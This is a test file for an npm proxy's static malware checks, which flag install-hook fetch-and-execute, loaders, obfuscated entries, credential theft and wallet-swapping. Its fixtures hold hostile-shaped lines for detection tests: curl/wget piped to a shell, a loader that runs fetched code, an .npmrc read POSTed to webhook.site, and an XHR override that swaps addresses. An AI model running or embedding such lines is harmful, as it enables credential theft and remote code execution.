// 0.1.5 tarball static checks, step 2 (design note §4, §5, §9): proxy/static-checks.js — the five checks S0–S4 as pure functions
// over the registry manifest, the tarball package.json and the walker's kept bodies (step 1), each a conjunction of two facts on one
// file, yielding rows { gate, result: ALLOW | SKIP | WARN, detail } from a closed vocabulary (marker names, a sanitised path, a size;
// never file content, never a host, never a command). The marker constants are the ops recon tool's (static-checks.mjs, v6.5) under
// the same version string, so a runtime row and a recon row read against each other. recordMc generalises to recordLate(rows).
// Written failing-first against the 0.1.5 step-1 tree.
import test from 'node:test';
import assert from 'node:assert/strict';
import { DEFAULTS } from '../../proxy/tar-walk.js';

const SC = () => import('../../proxy/static-checks.js');          // dynamic: absent on the step-1 tree, each test fails on its own
const MC = () => import('../../proxy/manifest-check.js');

const file = (path, src, extra = {}) => ({ path, buf: Buffer.isBuffer(src) ? src : Buffer.from(src), name: `package/${path}`, platformsNotChecked: [], ...extra });
const walkOf = (files, notKept = []) => ({ ok: true, packageJson: null, views: [], approx: [], files, notKept });
const row = (rows, id) => rows.find((r) => r.gate.startsWith(`static:${id}-`));
const idents = (n) => Array.from({ length: n }, (_, i) => `_0x${(0x1000 + i * 7).toString(16)}`);

// fixtures are TEXT shaped like the payload classes' markers; nothing here is a payload
const LOADER = 'const https = require("https"); const cp = require("child_process");\nhttps.get("https://cdn.example.invalid/stage2", (r) => { let b = ""; r.on("data", (c) => { b += c; }); r.on("end", () => cp.execSync(b)); });\n';
const BUILD_FETCH = 'const https = require("https");\nhttps.get("https://cdn.example.invalid/manifest.json", (r) => r.resume());\n';
const OBF = `${idents(25).map((x, i) => `var ${x}=${i};`).join('')}\neval(${idents(1)[0]});\n`;
const OBF_NO_DECODE = `${idents(25).map((x, i) => `var ${x}=${i};`).join('')}\nconsole.log(${idents(1)[0]});\n`;
const OBF_19 = `${idents(19).map((x, i) => `var ${x}=${i};`).join('')}\neval(${idents(1)[0]});\n`;
const MINIFIED = `${'var a=1,b=2,c=a+b;function f(x){return x*2}'.repeat(200)}eval("1")\n`;
const HEX_OBF = `${idents(21).map((x) => `var ${x}="${'\\x41'.repeat(30)}";`).join('')}\n`;
const CHARCODE_OBF = `${idents(21).map((x, i) => `var ${x}=${i};`).join('')}\nvar s=String.fromCharCode(${Array.from({ length: 60 }, (_, i) => 65 + (i % 26)).join(',')});\n`;
const HARVEST = 'const fs = require("fs"); const t = fs.readFileSync(require("os").homedir() + "/.npmrc", "utf8");\nfetch("https://webhook.site/aaaa-bbbb", { method: "POST", body: t });\n';
const HARVEST_POST_HOST = 'const tok = process.env.GITHUB_TOKEN;\nfetch("https://collect.example.invalid/in", { method: "POST", body: JSON.stringify({ tok }) });\n';
const CLI_REGISTRY = 'const tok = process.env.NPM_TOKEN;\nfetch("https://registry.npmjs.org/-/npm/v1/tokens", { method: "POST", headers: { authorization: tok } });\n';
const CLIPPER = 'const evm = /0x[a-fA-F0-9]{40}/g; const btc = /bc1[a-zA-HJ-NP-Z0-9]{25,39}/g;\nXMLHttpRequest.prototype.send = function (b) { return send.call(this, String(b).replace(evm, A).replace(btc, B)); };\n';
const WALLET_LIB = 'const evm = /0x[a-fA-F0-9]{40}/; const btc = /bc1[a-zA-HJ-NP-Z0-9]{25,39}/; const trx = /T[A-Za-z1-9]{33}/;\nmodule.exports = { isAddress: (s) => evm.test(s) || btc.test(s) || trx.test(s) };\n';
const ONE_REGEX_OVERRIDE = 'const evm = /0x[a-fA-F0-9]{40}/g;\nwindow.fetch = async (u, o) => realFetch(u, o);\n';
const HOOKED = { name: 'p', version: '1.0.0', main: 'index.js', scripts: { postinstall: 'node install.js' } };
const PLAIN = { name: 'p', version: '1.0.0', main: 'index.js' };

test('T1 identity: static-checks-1.6 (declared: S5 added, cft015-s8; S0 wording only, cft015-s9; recon 1.4, 1.5, then 1.6 facts only mirrored, R5, R9, R11), eight checks (S6, S7 by rulings R2, R3 2026-10-21, cft015-s6-s7) with the proxy gate names and the §5 notice texts, limits equal to the walker\'s caps', async () => {
  const S = await SC();
  assert.equal(S.STATIC_CHECKS_VERSION, 'static-checks-1.9');   // declared: 1.9 S0 and S6 (cft016-static-checks-1.9), 1.7 bound-module sinks, 1.8 S8 and S9 (cft015-static-checks-1.7, -1.8)
  assert.deepEqual(S.CHECKS.map((c) => c.id), ['S0', 'S1', 'S2', 'S3', 'S4', 'S5', 'S6', 'S7', 'S8', 'S9']);   // S8, S9: 1.8 (declared)
  assert.deepEqual(S.CHECKS.map((c) => c.gate), ['static:S0-shell-fetch-in-hook', 'static:S1-loader-in-hook-target', 'static:S2-obfuscated-entry', 'static:S3-secret-harvest-with-sink', 'static:S4-wallet-swap-hook', 'static:S5-oversized-hook-target',
    'static:S6-network-beacon-in-hook-target', 'static:S7-entry-capability-gain', 'static:S8-prebuilt-addon-dropper-in-hook', 'static:S9-hidden-script-in-gyp-build']);
  assert.deepEqual(S.CHECKS.map((c) => c.notice), ['an install script downloads code to run or sends data to an outside host', 'an install script runs a small loader that fetches and executes',
    'its entry file is obfuscated code', 'its code reads credentials and sends them to an outside host', 'its code rewrites wallet addresses in web traffic', 'an install script runs a file too large to read',
    'an install script sends details about this machine to the network', 'its entry file gained a capability its previous version did not have',
    // static-checks-1.8 (declared, cft015-static-checks-1.8)
    'an install script loads a prebuilt native module shipped without its source, next to an encoded file', 'its native build file runs a package script during install and hides the output']);
  assert.deepEqual(S.STATIC_GATES, S.CHECKS.map((c) => c.gate));
  assert.equal(S.LIMITS.maxKeep, DEFAULTS.maxKeep); assert.equal(S.LIMITS.maxKeepBytes, DEFAULTS.maxKeepBytes);
  assert.equal(S.LIMITS.s1MaxBytes, 8192); assert.equal(S.LIMITS.s2MinIdents, 20); assert.equal(S.LIMITS.s2MinCharCodes, 50); assert.equal(S.LIMITS.s2HexDensity, 0.15); assert.equal(S.LIMITS.s4MinAddressFamilies, 2);
  for (const c of S.CHECKS) for (const w of ['benign', 'clean', 'verdict', 'safe', 'malicious']) assert.ok(!new RegExp(w, 'i').test(c.notice), `${c.id}: ${w}`);
});

test('T2 keepListFor(manifest): hook targets first (node resolution variants), then main (default index.js), then up to 4 bin targets; what is dropped is stated; bounded', async () => {
  const S = await SC();
  const kl = S.keepListFor({ scripts: { preinstall: 'node scripts/setup', postinstall: 'node -r ./hook.js build/run.js' }, main: 'lib/entry', bin: { a: './bin/a.js', b: 'bin/b', c: 'bin/c.js', d: 'bin/d.js', e: 'bin/e.js' } });
  const roles = (p) => kl.roles[p];
  assert.deepEqual(roles('scripts/setup.js'), ['hook']); assert.deepEqual(roles('hook.js'), ['hook']); assert.deepEqual(roles('build/run.js'), ['hook']);
  assert.deepEqual(roles('lib/entry'), ['main']); assert.deepEqual(roles('lib/entry.js'), ['main']); assert.deepEqual(roles('lib/entry/index.js'), ['main']);
  assert.deepEqual(roles('bin/a.js'), ['bin']); assert.deepEqual(roles('bin/b'), ['bin']); assert.equal(roles('bin/e.js'), undefined);
  assert.ok(kl.dropped.some((d) => d.path === 'bin/e.js' && d.reason === 'bin targets beyond 4'));
  const i = (p) => kl.paths.indexOf(p); assert.ok(i('scripts/setup') < i('lib/entry') && i('lib/entry') < i('bin/a.js'));
  assert.deepEqual(S.keepListFor({ bin: 'cli.js' }).roles, { 'index.js': ['main'], 'index.js.js': ['main'], 'index.js.cjs': ['main'], 'index.js.mjs': ['main'], 'index.js/index.js': ['main'], 'cli.js': ['bin'] });
  const kl2 = S.keepListFor({ scripts: { postinstall: 'node $(cat x).js', install: 'node ../outside.js' }, main: 7 });
  assert.ok(kl2.dropped.some((d) => d.hook === 'postinstall' && /unsupported/.test(d.reason))); assert.ok(kl2.dropped.some((d) => /outside the package/.test(d.reason)));
  assert.deepEqual(kl2.roles['index.js'], ['main']); assert.equal(kl2.paths.some((p) => p.includes('..')), false);
  const many = Object.fromEntries(Array.from({ length: 200 }, (_, k) => [`b${k}`, `bin/b${k}.js`]));
  const kl3 = S.keepListFor({ scripts: { preinstall: 'node a.js && node b.js && node c.js && node d.js' }, main: 'm.js', bin: many });
  assert.ok(kl3.paths.length <= 24, `bounded (${kl3.paths.length})`); assert.ok(kl3.dropped.some((d) => d.reason === 'hook targets beyond 3'));
  assert.deepEqual(S.keepListFor(null).roles['index.js'], ['main']); assert.deepEqual(S.keepListFor({ scripts: 'oops' }).hooks, []);
});

test('T3 S0 hookFetchExec: a fetch AND an execute/decode in the same hook command; either alone, a || operator or node-gyp is not S0', async () => {
  const S = await SC();
  const ok = (cmd, f, e) => { const r = S.hookFetchExec(cmd); assert.deepEqual(r.fetch, f, cmd); assert.deepEqual(r.exec, e, cmd); assert.equal(r.fires, f.length > 0 && e.length > 0, cmd); };
  ok('curl -s https://x.example.invalid/i.sh | sh', ['curl'], ['pipe-to-shell']);
  ok('wget -qO- https://x.example.invalid/i | bash', ['wget'], ['pipe-to-shell']);
  ok('powershell -c "iwr https://x.example.invalid/a | iex"', ['Invoke-WebRequest'], ['Invoke-Expression']);
  ok('powershell -enc SQBuAHYAbwBrAGUA', [], ['powershell-encoded']);
  ok('certutil -urlcache -split -f https://x.example.invalid/a.exe a.exe && a.exe', ['certutil-urlcache'], []);
  ok('echo aW1wb3J0 | base64 -d | sh', [], ['base64-decode', 'pipe-to-shell']);
  ok('curl -fsSL https://x.example.invalid/releases.json -o rel.json', ['curl'], []);
  ok('prebuild-install || node-gyp rebuild', [], []);
  ok('prebuild-install || node scripts/build.js', [], []);
  ok('node scripts/postinstall.js', [], []);
  assert.equal(S.hookFetchExec(null).fires, false); assert.equal(S.hookFetchExec({ toString() { throw new Error('hostile'); } }).fires, false);
  const rows = S.staticRows({ manifest: { scripts: { preinstall: 'curl -s https://x.example.invalid/i.sh | sh' } }, packageJson: PLAIN, walk: walkOf([]) });
  const s0 = row(rows, 'S0'); assert.equal(s0.result, 'WARN');
  assert.equal(s0.detail, 'preinstall command contains a fetch (curl) and an execute (pipe-to-shell)');
  // a hook only the tarball package.json declares is read too (MC says they differ; S0 says what the tarball's one does)
  const rows2 = S.staticRows({ manifest: { scripts: {} }, packageJson: { ...PLAIN, scripts: { postinstall: 'wget -qO- https://x.example.invalid/i | bash' } }, walk: walkOf([]) });
  assert.equal(row(rows2, 'S0').detail, 'tarball package.json postinstall command contains a fetch (wget) and an execute (pipe-to-shell)');
  assert.equal(row(S.staticRows({ manifest: HOOKED, packageJson: HOOKED, walk: walkOf([]) }), 'S0').result, 'ALLOW');
  assert.equal(row(S.staticRows({ manifest: PLAIN, packageJson: PLAIN, walk: walkOf([]) }), 'S0').detail, 'no install hook');
});

test('T4 S1 loader-in-hook-target: a kept hook target under 8 KiB with a network sink AND an execution sink; network alone is ALLOW; 8 KiB and over is not checked; main is not a hook target', async () => {
  const S = await SC();
  const rows = S.staticRows({ manifest: HOOKED, packageJson: HOOKED, walk: walkOf([file('install.js', LOADER), file('index.js', 'module.exports = 1;\n')]) });
  const s1 = row(rows, 'S1'); assert.equal(s1.result, 'WARN');
  assert.equal(s1.detail, 'hook target install.js (211 B) has a network sink (http-request, url-literal) and an execution sink (child_process)');
  assert.ok(!s1.detail.includes('cdn.example.invalid') && !s1.detail.includes('execSync'));
  assert.deepEqual(Object.keys(s1), ['gate', 'result', 'detail']);
  assert.equal(row(S.staticRows({ manifest: HOOKED, packageJson: HOOKED, walk: walkOf([file('install.js', BUILD_FETCH)]) }), 'S1').result, 'ALLOW');
  const big = row(S.staticRows({ manifest: HOOKED, packageJson: HOOKED, walk: walkOf([file('install.js', `${LOADER}// ${'x'.repeat(8192)}\n`)]) }), 'S1');
  assert.equal(big.result, 'SKIP'); assert.match(big.detail, /^not checked: install\.js over 8 KiB/);
  const main = row(S.staticRows({ manifest: PLAIN, packageJson: PLAIN, walk: walkOf([file('index.js', LOADER)]) }), 'S1');
  assert.equal(main.result, 'ALLOW'); assert.equal(main.detail, 'no hook target to read');
});

test('T5 S2 obfuscated-entry: ≥ 20 distinct _0x identifiers AND a decode marker in a main or bin target; identifiers alone, 19 of them, or a minified bundle with eval is not S2', async () => {
  const S = await SC();
  const s2 = (src, pj = PLAIN) => row(S.staticRows({ manifest: pj, packageJson: pj, walk: walkOf([file('index.js', src)]) }), 'S2');
  const w = s2(OBF); assert.equal(w.result, 'WARN'); assert.equal(w.detail, 'entry file index.js (381 B) has 25 _0x identifiers and a decode marker (eval)');
  assert.equal(s2(OBF_NO_DECODE).result, 'ALLOW'); assert.equal(s2(OBF_19).result, 'ALLOW'); assert.equal(s2(MINIFIED).result, 'ALLOW');
  assert.match(s2(HEX_OBF).detail, /decode marker \(hex-density\)/); assert.match(s2(CHARCODE_OBF).detail, /decode marker \(fromCharCode-run\)/);
  const binPj = { ...PLAIN, bin: { p: 'cli.js' } };
  assert.equal(row(S.staticRows({ manifest: binPj, packageJson: binPj, walk: walkOf([file('cli.js', OBF)]) }), 'S2').result, 'WARN', 'bin targets are entry files');
  const hookOnly = row(S.staticRows({ manifest: HOOKED, packageJson: HOOKED, walk: walkOf([file('install.js', OBF)]) }), 'S2');
  // declared, static-checks-1.1: no entry file was read, so the row is the nothing-read SKIP naming index.js (cft015-s7 N1), never a WARN
  assert.equal(hookOnly.result, 'SKIP', 'a hook target is not an entry file'); assert.equal(hookOnly.detail, 'not checked: no eligible file in the tarball (index.js)');
});

test('T6 S3 secret-harvest-with-sink: a credential source AND an outbound sink to a non-registry host in one main, bin or hook file; the registry is not a sink', async () => {
  const S = await SC();
  const s3 = (src, pj = PLAIN, p = 'index.js') => row(S.staticRows({ manifest: pj, packageJson: pj, walk: walkOf([file(p, src)]) }), 'S3');
  const a = s3(HARVEST); assert.equal(a.result, 'WARN'); assert.equal(a.detail, 'index.js (168 B) has a credential source (npmrc) and an outbound sink (exfil-host, post-to-literal-host)');
  assert.ok(!a.detail.includes('webhook.site'));
  assert.equal(s3(HARVEST_POST_HOST).result, 'ALLOW', 'declared, static-checks-1.1: the S3 sink is the exfil-host class only (cft015-s7 C3)');
  assert.equal(s3(CLI_REGISTRY).result, 'ALLOW'); assert.equal(s3('const h = process.env.HOME;\nfetch("https://collect.example.invalid/x", { method: "POST" });\n').result, 'ALLOW');
  assert.equal(s3(HARVEST, HOOKED, 'install.js').result, 'WARN', 'hook targets are read for S3');
});

test('T7 S4 wallet-swap-hook: an override of XMLHttpRequest.prototype.send / window.fetch / window.ethereum.request AND ≥ 2 address-regex families in one entry file', async () => {
  const S = await SC();
  const s4 = (src) => row(S.staticRows({ manifest: PLAIN, packageJson: PLAIN, walk: walkOf([file('index.js', src)]) }), 'S4');
  const w = s4(CLIPPER); assert.equal(w.result, 'WARN'); assert.equal(w.detail, 'entry file index.js (195 B) has an override (xhr-send) and 2 address-regex families (evm, btc)');
  assert.equal(s4(WALLET_LIB).result, 'ALLOW'); assert.equal(s4(ONE_REGEX_OVERRIDE).result, 'ALLOW');
  assert.deepEqual(S.fileFacts(file('index.js', WALLET_LIB)).address_families, ['evm', 'btc', 'trx']);
});

test('T8 conventions: a failed or unarmed walk is all "not checked" rows; binary, over-cap and platform statements; a hostile path never reaches a detail; details are bounded', async () => {
  const S = await SC();
  const failed = S.staticRows({ manifest: HOOKED, packageJson: null, walk: { ok: false, reason: 'gunzip: unexpected end of file' } });
  assert.equal(failed.length, 10); for (const r of failed) { assert.equal(r.result, 'SKIP'); assert.equal(r.detail, 'not checked: gunzip: unexpected end of file'); }
  const unarmed = S.staticRows({ manifest: HOOKED, packageJson: HOOKED, walk: { ok: true, packageJson: null, views: [], approx: [] } });
  for (const r of unarmed) { assert.equal(r.result, 'SKIP'); assert.equal(r.detail, 'not checked: the tarball was not examined (keep list not armed)'); }
  assert.deepEqual(failed.map((r) => r.gate), S.STATIC_GATES);
  const bin = Buffer.concat([Buffer.from('\x7fELF'), Buffer.alloc(100)]);
  const b = row(S.staticRows({ manifest: PLAIN, packageJson: PLAIN, walk: walkOf([file('index.js', bin)]) }), 'S2');
  assert.equal(b.result, 'SKIP'); assert.equal(b.detail, 'not checked: index.js is binary (a NUL in the first 8000 bytes)');
  const over = row(S.staticRows({ manifest: PLAIN, packageJson: PLAIN, walk: walkOf([], [{ path: 'index.js', reason: 'over the kept-file cap (1048576 bytes)' }]) }), 'S2');
  assert.equal(over.result, 'SKIP'); assert.equal(over.detail, 'not checked: index.js over the kept-file cap (1048576 bytes)');
  const absent = row(S.staticRows({ manifest: PLAIN, packageJson: PLAIN, walk: walkOf([], [{ path: 'index.js', reason: 'not in the archive' }]) }), 'S2');
  assert.equal(absent.result, 'SKIP'); assert.equal(absent.detail, 'not checked: no eligible file in the tarball (index.js not in the archive)', 'declared, static-checks-1.1: nothing-read wording (cft015-s7 N1)');
  // the platform statement rides every row that read the file, WARN or ALLOW
  const plat = S.staticRows({ manifest: PLAIN, packageJson: PLAIN, walk: walkOf([file('index.js', OBF, { platformsNotChecked: ['macOS', 'Windows'] })]) });
  assert.match(row(plat, 'S2').detail, /decode marker \(eval\); not checked for macOS, Windows \(another entry installs there\)$/);
  assert.match(row(plat, 'S4').detail, /^entry files carry no override with address regexes \(1 file read\); not checked for macOS, Windows/);
  // publisher text: a path with control and bidi characters is stripped and capped at 80, as MC's shownName; a bin name with a hostile role is bounded too
  const nasty = `${'a'.repeat(100)}\u202e\x1b[2J.js`;
  const pj = { ...PLAIN, main: nasty };
  const n = row(S.staticRows({ manifest: pj, packageJson: pj, walk: walkOf([file(nasty, OBF)]) }), 'S2');
  assert.equal(n.result, 'WARN'); assert.ok(!/[\u0000-\u001f\u007f-\u009f\u202a-\u202e]/.test(n.detail)); assert.ok(n.detail.includes(`${'a'.repeat(80)}…`));
  for (const r of [...plat, ...failed, n]) { assert.ok(r.detail.length <= 400, r.detail.length); assert.ok(['ALLOW', 'SKIP', 'WARN'].includes(r.result)); }
  // the keep list that armed the walk is the manifest's; a kept file the manifest did not name (a function keep) is still read by its path's role
  const extra = S.staticRows({ manifest: PLAIN, packageJson: { ...PLAIN, main: 'real.js' }, walk: walkOf([file('index.js', 'x'), file('real.js', OBF)], [{ path: 'real.js', reason: 'named by the tarball package.json only' }]) });
  assert.equal(row(extra, 'S2').result, 'WARN', 'a kept body named by the tarball package.json as main is an entry file');
});

test('T9 recordLate(rows): several late rows join the version\'s decision in one write; unchanged rows write nothing; recordMc is recordLate of one row', async () => {
  const M = await MC();
  const latest = { id: 7, gates_fired: [{ gate: 'install-introduced', result: 'WARN', detail: 'x' }, { gate: 'install-manifest-mismatch', result: 'ALLOW', detail: 'ok' }] };
  const writes = []; let fresh = latest;
  const db = { getLatestNonOverrideDecision: () => fresh, insertGateDecision: (p, v, agg, rows) => writes.push({ p, v, agg, rows }) };
  const rows = [{ gate: 'static:S0-shell-fetch-in-hook', result: 'ALLOW', detail: 'no install hook' }, { gate: 'static:S1-loader-in-hook-target', result: 'WARN', detail: 'hook target a.js (10 B) …' }];
  assert.equal(M.recordLate({ db, pkg: 'p', version: '1.0.0', latest, rows }), 'wrote');
  assert.equal(writes.length, 1); assert.equal(writes[0].agg, 'WARN');
  assert.deepEqual(writes[0].rows.map((r) => r.gate), ['install-introduced', 'install-manifest-mismatch', 'static:S0-shell-fetch-in-hook', 'static:S1-loader-in-hook-target']);
  const after = { id: 8, gates_fired: writes[0].rows }; fresh = after;                // the write landed: the stored decision is now `after`
  assert.equal(M.recordLate({ db, pkg: 'p', version: '1.0.0', latest: after, rows }), false, 'nothing changed: no write');
  assert.equal(M.recordLate({ db, pkg: 'p', version: '1.0.0', latest: after, rows: [{ ...rows[1], result: 'SKIP', detail: 'not checked: x' }] }), 'wrote');
  assert.equal(writes[1].rows.filter((r) => r.gate === rows[1].gate).length, 1, 'a row replaces its gate\'s earlier row');
  fresh = { id: 99 };
  assert.equal(M.recordLate({ db, pkg: 'p', version: '1.0.0', latest: after, rows: [{ ...rows[0], detail: 'changed' }] }), 'raced');
  fresh = after;
  assert.equal(M.recordMc({ db, pkg: 'p', version: '1.0.0', latest: after, row: { gate: 'install-manifest-mismatch', result: 'WARN', detail: 'differs' } }), 'wrote');
  assert.equal(M.recordLate({ db, pkg: 'p', version: '1.0.0', latest: after, rows: [] }), false);
  assert.equal(M.lateDeterminate(after, M.GATE), true); assert.equal(M.lateDeterminate(after, 'static:S0-shell-fetch-in-hook'), true);
  assert.equal(M.lateDeterminate(after, 'static:S2-obfuscated-entry'), false); assert.equal(M.lateDeterminate({ gates_fired: [{ gate: 'static:S2-obfuscated-entry', result: 'SKIP' }] }, 'static:S2-obfuscated-entry'), false);
});
